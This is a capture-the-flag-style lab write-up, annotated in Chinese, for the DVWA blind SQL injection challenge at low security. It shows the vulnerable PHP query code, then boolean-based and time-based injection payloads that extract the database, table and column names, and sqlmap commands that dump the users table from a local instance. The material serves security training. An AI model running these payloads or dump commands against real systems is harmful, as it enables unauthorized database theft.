# SQL Injection (Blind) - Low

## View Source

```PHP
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

- [`mysqli_num_rows()`](https://www.php.net/manual/zh/mysqli-result.num-rows.php)
    - 回傳結果的有幾筆

## Code Review

- 相較於 *SQL Injection* 有 `die()` 和 `mysqli_error()` 等來將資料庫的錯誤訊息顯示出來，*Blind SQLi* 只能得知 *exist / MISSING* 兩種情況

## Answer

1. 先嘗試後端處理 *SQL* 語句的資料型態
    - E.g., 不合理
        - `1 AND 1=1 #` (*True*)
        - `1 AND 1=2 #` (*True*)
    - E.g., 合理 (過程可能需要經過一連串的嘗試來判斷)
        - `1' AND 1=1 #` (*True*)
        - `1' AND 1=2 #` (***False***)
        1. 透過有引號來猜測是字串型態
        2. 因為 `True AND True = True`，代表 `1'` 為 `True`，就可利用 `AND` 右側來構造語句
2. 猜測資料庫名稱長度
    1. `1' AND LENGTH(DATABASE())=1 #` (*False*)
    2. `1' AND LENGTH(DATABASE())=2 #` (*False*)
    3. `1' AND LENGTH(DATABASE())=3 #` (*False*)
    4. `1' AND LENGTH(DATABASE())=4 #` (***True***)
    - ***the name of the current database = "????"***
3. 逐字猜測資料庫名稱
    1. `1' AND ASCII(SUBSTR(DATABASE(), 1, 1))>97  #` (*True*)
    2. `1' AND ASCII(SUBSTR(DATABASE(), 1, 1))>98  #` (*True*)
    3. `1' AND ASCII(SUBSTR(DATABASE(), 1, 1))>99  #` (***True***)
    4. `1' AND ASCII(SUBSTR(DATABASE(), 1, 1))>100 #` (***False***)
    - ***the name of the current database = "d???"***
    - 可用二分搜來減少猜測次數
        1. `1' AND ASCII(SUBSTR(DATABASE(), 2, 1))>109  #` (*True*)
        2. `1' AND ASCII(SUBSTR(DATABASE(), 2, 1))>115  #` (*True*)
        3. `1' AND ASCII(SUBSTR(DATABASE(), 2, 1))>118  #` (*False*)
        4. `1' AND ASCII(SUBSTR(DATABASE(), 2, 1))=118  #` (***True***)
        - ***the name of the current database = "dv??"***
4. 猜測資料庫中表的數量
    - `1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())=2 #` (***True***)
        - 暴雷，一樣要經過類似前三步驟的過程，以下同
5. 猜測表的名稱長度
    - `1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1))=9 #` (***True***)
6. 猜測表的名字
    - `1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1))>97 #` (***True***)
7. 爆破表的欄位數量、欄位名稱長度、欄位名稱、資料表內容等

### Time Based

- 需要考慮原本網頁的回應時間來決定 `SLEEP()` 參數，因為是本地比較快就不需要到 *10* 秒
- `1' AND SLEEP(10) #`
- `1' AND IF(LENGTH(DATABASE())=4, SLEEP(10), 1) #`

### sqlmap

- 先獲取 *Cookie* 不然會被重導向到登入頁面
    - E.g., *Console* 輸入 `document.cookie`
- [*sqlmap Usage*](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

### Example

```
1' AND LENGTH(VERSION())=24 #
1' AND IF(LENGTH(VERSION())=24, SLEEP(10), 1) #
```

```
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=t8cp4e35u05g9gnd8dqt4emp23; security=low" --batch --dbs
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=t8cp4e35u05g9gnd8dqt4emp23; security=low" --batch -D dvwa --tables
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=t8cp4e35u05g9gnd8dqt4emp23; security=low" --batch -D dvwa -T users --dump
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=t8cp4e35u05g9gnd8dqt4emp23; security=low" --batch --banner
```

### Note

- 根據資料庫系統的不同，語法可能就會有落差